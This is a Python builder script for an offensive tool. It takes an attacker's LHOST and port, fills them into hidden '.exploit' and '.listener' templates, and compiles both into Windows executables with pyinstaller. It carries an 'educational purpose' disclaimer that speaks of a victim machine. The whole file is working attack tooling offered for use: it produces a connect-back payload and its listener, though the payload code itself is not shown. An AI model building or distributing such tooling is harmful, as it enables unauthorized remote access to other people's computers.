## DISCLAIMER ##
'''
DO NOT MISUSE THIS
I WILL NOT BE RESPONSIBLE FOR ANY HARM CAUSED BY THIS
I DO NOT ENCOURAGE USING THIS
THIS IS JUST FOR EDUCATIONAL PURPOSE
IF YOU ARE TRYING THIS, MAKE SURE YOU HAVE THE PERMISSION OF THE VICTIM MACHINE's OWNER
'''
import os

def clear():
    if os.name == 'posix':
        os.system('clear')
    else:
        os.system('cls')

BANNER = '''

██╗░░██╗░██╗░░░░░░░██╗██╗███╗░░██╗██████╗░
██║░░██║░██║░░██╗░░██║██║████╗░██║██╔══██╗
███████║░╚██╗████╗██╔╝██║██╔██╗██║██║░░██║
██╔══██║░░████╔═████║░██║██║╚████║██║░░██║
██║░░██║░░╚██╔╝░╚██╔╝░██║██║░╚███║██████╔╝
╚═╝░░╚═╝░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚══╝╚═════╝░

                by: agpriyansh

'''

if __name__ == '__main__':
    clear()
    print(BANNER)

    # take info
    LHOST = input('[+] Enter the LHOST : ')
    port = input('[+] Enter the port : ')

    # making exploit
    f = open('./.exploit')
    code = f.read()
    f.close()
    code = code.replace('#LHOST#', LHOST)
    code = code.replace('#port#', port)
    f = open('./exploit.py', 'w')
    f.write(code)
    f.close()
    # making exe
    if os.name == 'nt':
        os.system('pyinstaller --onefile exploit.py')
        os.system('del exploit.spec')
        os.system('echo Y | rmdir /S __pycache__')
        os.system('echo Y | rmdir /S build')
        os.system('move .\\dist\\exploit.exe .')
        os.system('echo Y | rmdir /S dist')
    if os.name == 'posix':
        print('Windows executable .exe can only be generated on windows.')

    # making listener
    f = open('./.listener')
    code = f.read()
    f.close()
    code = code.replace('#LHOST#', LHOST)
    code = code.replace('#port#', port)
    f = open('./listener.py', 'w')
    f.write(code)
    f.close()
    # making exe
    if os.name == 'nt':
        os.system('pyinstaller --onefile listener.py')
        os.system('del listener.spec')
        os.system('echo Y | rmdir /S __pycache__')
        os.system('echo Y | rmdir /S build')
        os.system('move .\\dist\\listener.exe .')
        os.system('echo Y | rmdir /S dist')
    if os.name == 'posix':
        print('Windows executable .exe can only be generated on windows.')

    print('\n\nExploit and listener created successfully.')